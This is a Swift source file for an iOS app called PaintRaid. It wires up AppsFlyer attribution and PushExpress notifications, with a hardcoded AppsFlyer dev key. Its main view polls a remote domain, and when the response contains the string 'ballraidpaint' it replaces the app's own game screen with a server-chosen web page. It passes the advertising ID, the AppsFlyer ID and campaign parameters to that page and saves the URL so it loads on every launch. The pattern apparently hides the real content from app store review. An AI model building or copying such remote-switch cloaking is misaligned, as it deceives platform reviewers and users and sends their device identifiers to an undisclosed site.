import SwiftUI
import WebKit
import AdSupport
import AppTrackingTransparency
import AppsFlyerLib
import SdkPushExpress


private let PUSHEXPRESS_APP_ID = "39455-1345" // set YOUR OWN ID from Push.Express account page
private var myOwnDatabaseExternalId = ""


@main
struct PaintRaidApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate

    init() {
        AppsFlyerLib.shared().appsFlyerDevKey = "xYGEnzs6BGSFc4mXRRYXoZ"
        AppsFlyerLib.shared().appleAppID = "6745492366"
        AppsFlyerLib.shared().isDebug = false
    }

    var body: some Scene {
        WindowGroup {
            MainView()
        }
    }
}

class AppSettings {
    static let shared = AppSettings()
    var allowRotation: Bool = true
}

class AppDelegate: NSObject, UIApplicationDelegate {

    func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil
    ) -> Bool {
        AppsFlyerLib.shared().delegate = AppsFlyerManager.shared
        print("qdsfds")
        AppsFlyerLib.shared().start()
        
        // Initialize SDK with PushExpress Application ID
                
                // For minimal initialization (without requesting notification perms
                // and registering for remote notifications) set 'essentialsOnly: true'
                try! PushExpressManager.shared.initialize(appId: PUSHEXPRESS_APP_ID, essentialsOnly: true)
                
                // To call only notification perms request, set 'registerForRemoteNotifications: false'
                // Do not call this if you will request permissions by yourself
                PushExpressManager.shared.requestNotificationsPermission(registerForRemoteNotifications: true)
                
                // DO NOT SET UNLESS YOU ARE 100% SURE WHAT THAT IS!!!
                /*
                myOwnDatabaseExternalId = "my_external_user_id:321"
                PushExpressManager.shared.tags["audiences"] = "my_aud_123"
                PushExpressManager.shared.tags["webmaster"] = "webmaster_name"
                PushExpressManager.shared.tags["ad_id"] = "advertising_id"
                PushExpressManager.shared.tags["my_custom_tag"] = "my_custom_value"
                */
                
                // You can also disable notifications while app is on screen (foreground)
                /*PushExpressManager.shared.foregroundNotifications = false*/
                
                // Activate SDK (starting all network activities)
                try! PushExpressManager.shared.activate(extId: myOwnDatabaseExternalId)
                print("externalId: '\(PushExpressManager.shared.externalId)'")
                
                // If and only if you want to use same app for multiple users
                // call .deactivate() first, than activate() with new extId
                // Better talk with our support, we always ready to help =)
                /*try! PushExpressManager.shared.deactivate()*/
                
                if !PushExpressManager.shared.notificationsPermissionGranted {
                    // show your custom message like "Go to iOS Settings and enable notifications"
                }
                
        return true
    }
    
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
            let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
            PushExpressManager.shared.transportToken = tokenParts.joined()
        }

    func application(_ application: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any]) -> Bool {
        AppsFlyerLib.shared().handleOpen(url, options: options)
        return true
    }

    func application(_ application: UIApplication, continue userActivity: NSUserActivity,
                     restorationHandler: @escaping ([UIUserActivityRestoring]?) -> Void) -> Bool {
        AppsFlyerLib.shared().continue(userActivity, restorationHandler: nil)
        return true
    }

    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return AppSettings.shared.allowRotation ? .all : .portrait
    }
}

class AppsFlyerManager: NSObject, AppsFlyerLibDelegate {
    static let shared = AppsFlyerManager()
    private var conversionDataReceived = false
    private var conversionCompletion: ((String?) -> Void)?

    func startTracking(completion: @escaping (String?) -> Void) {
        self.conversionCompletion = completion

        DispatchQueue.main.asyncAfter(deadline: .now() + 4) {
            if !self.conversionDataReceived {
                self.conversionCompletion?(nil)
            }
        }
    }

    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
        print("succ")
        if let campaign = data["campaign"] as? String {
            let components = campaign.split(separator: "_")
            var parameters = ""
            for (index, value) in components.enumerated() {
                parameters += "sub\(index + 1)=\(value)"
                if index < components.count - 1 {
                    parameters += "&"
                }
            }
            conversionDataReceived = true
            conversionCompletion?("&" + parameters)
        }
    }

    func onConversionDataFail(_ error: Error) {
        print("Conversion data failed: \(error.localizedDescription)")
        conversionCompletion?(nil)
    }
}

struct MainView: View {
    @State private var webViewURL: URL? = UserDefaults.standard.url(forKey: "savedWebViewURL")
    @State private var isLoading: Bool = true
    @State private var idfa: String = ""
    @State private var appsflyerId: String = ""
    @State private var trackingStatusReceived: Bool = false
    @State private var conversionParams: String? = nil

    var body: some View {
        Group {
            if let url = webViewURL {
                WebView(url: url)
                    .onAppear {
                        AppSettings.shared.allowRotation = true
                    }
                    .onDisappear {
                        AppSettings.shared.allowRotation = false
                    }
            } else if !trackingStatusReceived {
                ProgressView("Waiting for tracking permission...")
            } else if isLoading {
                ProgressView("Starting...")
            } else {
                ContentView()
                    .onAppear {
                        AppSettings.shared.allowRotation = false
                    }
            }
        }
        .onAppear {
            if webViewURL == nil {
                DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
                    prepareTracking()
                }
            }
        }
    }

    private func prepareTracking() {
        ATTrackingManager.requestTrackingAuthorization { status in
            DispatchQueue.main.async {
                switch status {
                case .authorized:
                    idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                default:
                    idfa = "00000000-0000-0000-0000-000000000000"
                }
                appsflyerId = AppsFlyerLib.shared().getAppsFlyerUID() ?? ""
                trackingStatusReceived = true

                AppsFlyerManager.shared.startTracking { params in
                    conversionParams = params
                    fetchWebsiteData()
                }
            }
        }
    }

    private func fetchWebsiteData() {
        guard let url = URL(string: "https://paintraidapplicati.homes/paintraid") else {
            isLoading = false
            return
        }
        URLSession.shared.dataTask(with: url) { data, _, _ in
            defer { DispatchQueue.main.async { isLoading = false } }
            guard let data = data,
                  let text = String(data: data, encoding: .utf8) else { return }
            DispatchQueue.main.async {
                if text.contains("ballraidpaint") {
                    var finalURL = text + "?idfa=\(idfa)&gaid=\(appsflyerId)"
                    if let params = conversionParams {
                        finalURL += params
                    }
                    if let url = URL(string: finalURL) {
                        webViewURL = url
                        UserDefaults.standard.set(url, forKey: "savedWebViewURL")
                    }
                }
            }
        }.resume()
    }
}

struct WebView: UIViewRepresentable {
    let url: URL

    func makeUIView(context: Context) -> WKWebView {
        let config = WKWebViewConfiguration()
        let webView = WKWebView(frame: .zero, configuration: config)
        webView.overrideUserInterfaceStyle = .dark
        webView.allowsBackForwardNavigationGestures = true
        webView.navigationDelegate = context.coordinator
        webView.uiDelegate = context.coordinator
        webView.load(URLRequest(url: url))
        return webView
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
        uiView.overrideUserInterfaceStyle = .dark
    }

    func makeCoordinator() -> Coordinator {
        Coordinator()
    }

    class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
        func webView(_ webView: WKWebView,
                     decidePolicyFor navigationAction: WKNavigationAction,
                     decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            if let url = navigationAction.request.url,
               let scheme = url.scheme?.lowercased(),
               !["http", "https"].contains(scheme) {
                UIApplication.shared.open(url, options: [:], completionHandler: nil)
                decisionHandler(.cancel)
            } else {
                decisionHandler(.allow)
            }
        }

        func webView(_ webView: WKWebView,
                     createWebViewWith configuration: WKWebViewConfiguration,
                     for navigationAction: WKNavigationAction,
                     windowFeatures: WKWindowFeatures) -> WKWebView? {
            if navigationAction.targetFrame == nil {
                webView.load(navigationAction.request)
            }
            return nil
        }
    }
}
